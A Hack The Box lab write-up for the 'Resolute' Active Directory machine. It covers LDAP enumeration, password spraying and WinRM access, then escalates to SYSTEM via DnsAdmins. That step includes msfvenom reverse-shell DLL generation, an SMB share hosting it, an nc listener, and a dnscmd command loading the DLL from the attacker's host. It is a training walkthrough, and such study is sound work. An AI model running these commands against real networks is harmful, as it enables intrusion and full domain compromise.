# Hack The Box - Resolute

![Resolute](https://img.shields.io/badge/Hack%20The%20Box-Resolute-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white)
![Windows](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Active Directory](https://img.shields.io/badge/Active%20Directory-Enabled-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)

## Machine Information

| Property | Details |
|---|---|
| Machine | Resolute |
| Platform | Hack The Box |
| Operating System | Windows |
| Difficulty | Medium |
| Machine Type | Active Directory |
| Domain | `megabank.local` |
| Target IP | `10.129.96.155` |
| Initial Access | LDAP Enumeration → Password Spraying → WinRM |
| Lateral Movement | PowerShell Transcripts → Reused Credentials |
| Privilege Escalation | DnsAdmins Abuse |
| Final Privilege | `NT AUTHORITY\SYSTEM` |

## Overview

Resolute is a Windows Active Directory machine that demonstrates how anonymous LDAP enumeration can expose sensitive information stored inside user attributes.

The attack began by identifying the target as a Domain Controller belonging to the `megabank.local` domain. Anonymous LDAP access allowed the enumeration of domain users and the inspection of their attributes. During this process, a password was discovered inside the description of a user account.

After reviewing the domain account lockout policy, the discovered password was tested against the enumerated users through password spraying. The password was valid for the user `melanie`, providing initial access to the target through WinRM.

While enumerating the file system as `melanie`, a hidden PowerShell transcript directory was discovered. The transcript contained credentials exposed through a command executed by another user. These credentials belonged to `ryan`, who had remote management access and was a member of the privileged `DnsAdmins` group.

The membership in `DnsAdmins` was abused to configure the DNS service to load a malicious DLL hosted through an Impacket SMB server. After starting a listener and restarting the DNS service, the malicious DLL was executed and a reverse shell was obtained as `NT AUTHORITY\SYSTEM`.

## Attack Path

```text
Nmap Enumeration
        │
        ▼
Active Directory Domain Controller Identified
        │
        ▼
Anonymous LDAP Enumeration
        │
        ▼
Domain User Enumeration
        │
        ▼
Password Discovered in LDAP Description
        │
        ▼
Domain Password Policy Enumeration
        │
        ▼
Password Spraying
        │
        ▼
Valid Credentials for melanie
        │
        ▼
WinRM Access
        │
        ▼
PowerShell Transcript Discovery
        │
        ▼
Credentials for ryan
        │
        ▼
WinRM Access as ryan
        │
        ▼
DnsAdmins Group Membership
        │
        ▼
Malicious DLL Generated with msfvenom
        │
        ▼
DLL Hosted with Impacket SMB Server
        │
        ▼
DNS Service Configured to Load the DLL
        │
        ▼
DNS Service Restarted
        │
        ▼
Reverse Shell as NT AUTHORITY\SYSTEM
        │
        ▼
Root Flag
```

# 1. Reconnaissance

```bash
nmap -sS -sV -sC -p- 10.129.96.155 -oN nmap
```
<img width="959" height="765" alt="image" src="https://github.com/user-attachments/assets/703469bc-37d7-499e-9267-ac220b39056c" />

The scan revealed several services commonly associated with a Windows Active Directory Domain Controller.

Important services included:

| Port | Service | Description |
|---:|---|---|
| 53 | DNS | Domain Name System |
| 88 | Kerberos | Active Directory authentication |
| 135 | MSRPC | Microsoft Remote Procedure Call |
| 139 | NetBIOS | Windows networking |
| 389 | LDAP | Active Directory directory services |
| 445 | SMB | Windows file sharing |
| 464 | Kerberos Password Change | Kerberos password operations |
| 593 | RPC over HTTP | Microsoft RPC |
| 636 | LDAPS | LDAP over SSL |
| 3268 | Global Catalog LDAP | Active Directory Global Catalog |
| 3269 | Global Catalog LDAPS | Encrypted Global Catalog |
| 5985 | WinRM | Windows Remote Management |

The enumeration identified the target as a Domain Controller for the following domain:

```text
megabank.local
```

The hostname associated with the Domain Controller was:

```text
resolute.megabank.local
```

The domain information was added to `/etc/hosts` to simplify future enumeration.

```bash
sudo nano /etc/hosts
```

The following entry was added:

```text
10.129.96.155 resolute.megabank.local megabank.local
```

# 2. LDAP Enumeration

Because LDAP was exposed, the next step was to determine whether anonymous LDAP queries were allowed.

The domain users were enumerated using `windapsearch`.

```bash
windapsearch \
-d megabank.local \
--dc-ip 10.129.96.155 \
-U
```

The command returned a list of users belonging to the domain.

To inspect all available LDAP attributes, the enumeration was repeated using the `--full` option.

```bash
windapsearch \
-d megabank.local \
--dc-ip 10.129.96.155 \
-U \
--full
```

The output was searched for references to passwords.

```bash
windapsearch \
-d megabank.local \
--dc-ip 10.129.96.155 \
-U \
--full | grep -i password
```

A password was discovered inside the description of a domain user.

```text
Password: Welcome123!
```

The description indicated that this password had been assigned to a newly created account.

Although the original user may have changed their password, the discovered value could still be in use by another domain account. This made the password a candidate for a controlled password-spraying attack.

# 3. Domain Password Policy

Before attempting password spraying, the domain account lockout policy was reviewed to avoid accidentally locking user accounts.

The domain password policy was enumerated using NetExec.

```bash
nxc smb 10.129.96.155 \
-u '' \
-p '' \
--pass-pol
```

The output indicated that the account lockout threshold was not configured.

```text
Lockout Threshold: 0
```

This meant that the domain did not automatically lock accounts after failed authentication attempts.

The absence of an account lockout policy allowed the discovered password to be tested against the enumerated domain users.

# 4. User Enumeration

The LDAP user enumeration was saved to a file for use during password spraying.

```bash
windapsearch \
-d megabank.local \
--dc-ip 10.129.96.155 \
-U > users
```

The usernames were extracted from the output and saved to a dedicated wordlist.

```bash
cat users | \
awk -F@ '{print $1}' | \
awk -F: '{print $2}' \
> users.txt
```

The resulting file contained the domain usernames that would be tested with the discovered password.

```bash
cat users.txt
```

# 5. Password Spraying

The password discovered through LDAP enumeration was tested against the domain users.

```bash
nxc smb 10.129.96.155 \
-u users.txt \
-p 'Welcome123!' \
--continue-on-success
```

A successful authentication was identified for the user `melanie`.

```text
megabank.local\melanie:Welcome123!
```

The target exposed WinRM on port `5985`, making it possible to obtain an interactive PowerShell session using Evil-WinRM.

# 6. Initial Access - Melanie

The valid credentials were used to connect to the target through WinRM.

```bash
evil-winrm \
-i 10.129.96.155 \
-u melanie \
-p 'Welcome123!'
```

The connection was successful and provided an interactive PowerShell session as the user:

<img width="953" height="216" alt="image" src="https://github.com/user-attachments/assets/8f49dcff-6d46-481a-be5b-d8f26e9d93a7" />


```text
megabank\melanie
```

The current identity was verified.

```powershell
whoami
```

Output:

```text
megabank\melanie
```

The available user information was enumerated.

```powershell
whoami /all
```

The user flag was located inside Melanie's Desktop directory.

```powershell
cd C:\Users\melanie\Desktop

type user.txt
```

# 7. Local Enumeration

The next objective was to enumerate the target for files, directories, credentials, scripts, logs, and other potentially sensitive information.

The root of the `C:` drive was inspected.

```powershell
cd C:\

dir
```

No immediately useful information was displayed.

The directory enumeration was repeated using the `-Force` parameter to reveal hidden files and directories.

```powershell
dir -Force
```

A hidden directory named `PSTranscripts` was discovered.

```text
C:\PSTranscripts
```

The directory was accessed and enumerated.

```powershell
cd C:\PSTranscripts

dir -Force
```

A hidden directory containing PowerShell transcript logs was identified.

```text
20191203
```

The directory was accessed.

```powershell
cd C:\PSTranscripts\20191203

dir -Force
```

A PowerShell transcript file was discovered.

```text
PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```


The contents of the transcript were displayed.

```powershell
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

<img width="958" height="199" alt="image" src="https://github.com/user-attachments/assets/a6cffa4d-a59b-469c-89d0-b9fa6fa293f0" />


The transcript contained a command that exposed credentials in clear text.

The credentials belonged to the domain user `ryan`.

```text
Username: ryan
Password: Serv3r4Admin4cc123!
```

The transcript had captured the original command because the credentials were passed directly through the command line.

# 8. Lateral Movement - Ryan

The credentials discovered inside the PowerShell transcript were used to establish a new WinRM session as `ryan`.

```bash
evil-winrm \
-i 10.129.96.155 \
-u ryan \
-p 'Serv3r4Admin4cc123!'
```

The connection was successful.

The current identity was verified.

```powershell
whoami
```

Output:

```text
megabank\ryan
```
<img width="959" height="234" alt="image" src="https://github.com/user-attachments/assets/fd7ada83-0c29-4cfe-aa7b-29b5892b4577" />


The user privileges and group memberships were enumerated.

```powershell
whoami /all
```

The output revealed that `ryan` was a member of the following privileged Active Directory group:


<img width="954" height="457" alt="image" src="https://github.com/user-attachments/assets/03ea56f5-4bb9-4e70-951e-4aff8380aa72" />


```text
DnsAdmins
```

The group membership was also verified using:

```powershell
net user ryan
```

The `DnsAdmins` group can be abused to configure the DNS Server service to load an arbitrary DLL.

This provided a path to execute malicious code with elevated privileges.

# 9. Privilege Escalation - DnsAdmins Abuse

## 9.1 Generating the Malicious DLL

A malicious DLL payload was generated using `msfvenom`.

The payload was configured to connect back to the attacking machine.

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 -f dll > rev.dll
```

The generated DLL was verified.

```bash
file rev.dll
```
<img width="953" height="180" alt="image" src="https://github.com/user-attachments/assets/f3537418-f348-42fb-ade1-15f31f26c693" />


The output confirmed that the file was a Windows DLL.

## 9.2 Hosting the DLL with Impacket SMB Server

The malicious DLL needed to be accessible to the target through a network path.

An SMB server was started using Impacket.

```bash
sudo impacket-smbserver exploit $(pwd)
```

The SMB server exposed the current directory under the share name:

```text
exploit
```

The malicious DLL could therefore be accessed by the target through the following UNC path:

```text
\\10.10.14.65\exploit\rev.dll
```

## 9.3 Starting the Listener

Before triggering the malicious DLL, a Netcat listener was started on the same port configured in the payload.

```bash
nc -lvnp 4444
```

The listener was left running while the DNS service was configured.

## 9.4 Configuring the DNS Server Plugin

From the Evil-WinRM session as `ryan`, the DNS Server service was configured to load the malicious DLL.

```powershell
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.65\exploit\rev.dll
```

The command configured the DNS Server plugin path to point to the DLL hosted on the attacking machine.


## 9.5 Restarting the DNS Service

The DNS service needed to be restarted so that the configured plugin DLL would be loaded.

The service was stopped using:

```powershell
sc.exe stop dns
```

The DNS service was then started again.

```powershell
sc.exe start dns
```

<img width="953" height="438" alt="image" src="https://github.com/user-attachments/assets/08ab33a3-85b5-41bc-8c11-221e9b87e95b" />


After the service restarted, the target connected to the Impacket SMB server and retrieved the malicious DLL.

The DLL was loaded by the DNS service and executed with elevated privileges.

# 10. SYSTEM Shell

The Netcat listener received a reverse shell from the target.

The current identity was verified.

```cmd
whoami
```

Output:

```text
nt authority\system
```

<img width="955" height="183" alt="image" src="https://github.com/user-attachments/assets/56da9f7f-cb14-4c72-a6b8-8d7dab64f0f8" />



The reverse shell was running with the highest local privilege level.

Additional information was collected.

```cmd
whoami /priv
```

The hostname was verified.

```cmd
hostname
```

The system information was displayed.

```cmd
systeminfo
```

# 11. Root Flag

The Administrator profile was accessed.

```cmd
cd C:\Users\Administrator\Desktop
```

The root flag was displayed.

```cmd
type root.txt
```

# 12. Lessons Learned

Resolute demonstrates several important Active Directory attack concepts:

- Anonymous LDAP access can expose sensitive information stored inside user attributes.
- User descriptions and other LDAP fields should be reviewed for passwords, credentials, internal notes, and operational information.
- Password spraying should be performed only after reviewing the domain account lockout policy.
- Reused default passwords can provide an initial foothold into an Active Directory environment.
- WinRM can provide direct PowerShell access when valid domain credentials are available.
- Hidden directories should be included during local Windows enumeration.
- PowerShell transcript logs may expose commands and credentials executed by other users.
- Credentials passed through the command line can remain exposed inside logging artifacts.
- Group memberships must be reviewed carefully during Active Directory post-exploitation.
- Membership in `DnsAdmins` can be abused to configure the DNS Server service to load an arbitrary DLL.
- A malicious DLL can be hosted remotely using Impacket's SMB server.
- Restarting the DNS service causes the configured plugin DLL to be loaded.
- The DNS service executes with elevated privileges, allowing privilege escalation to `NT AUTHORITY\SYSTEM`.

# 13. Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning and service enumeration |
| Windapsearch | Anonymous LDAP enumeration |
| LDAP | Active Directory user and attribute enumeration |
| NetExec | Password policy enumeration and password spraying |
| Evil-WinRM | Remote PowerShell access through WinRM |
| PowerShell | Local enumeration and transcript analysis |
| Impacket SMB Server | Hosting the malicious DLL |
| msfvenom | Generating the malicious reverse shell DLL |
| Netcat | Receiving the reverse shell |
| dnscmd | Configuring the DNS Server plugin |
| sc.exe | Restarting the DNS service |

# 14. Conclusion

Resolute was an excellent Active Directory machine that demonstrated how several small security weaknesses can be chained to obtain complete control over a Domain Controller.

The attack began with anonymous LDAP enumeration, which exposed a password stored inside a user description. Password spraying identified a valid account and provided initial access through WinRM.

Local enumeration as `melanie` revealed hidden PowerShell transcript logs containing credentials for another domain user. The credentials allowed lateral movement to `ryan`, whose membership in the `DnsAdmins` group created a direct privilege-escalation path.

By generating a malicious DLL with `msfvenom`, hosting it through an Impacket SMB server, configuring the DNS service to load it, and restarting the service, a reverse shell was obtained as:

```text
NT AUTHORITY\SYSTEM
```

The machine highlighted the importance of securing LDAP information, enforcing strong password policies, protecting PowerShell logs, avoiding credential exposure through command-line arguments, and carefully controlling privileged Active Directory group memberships.
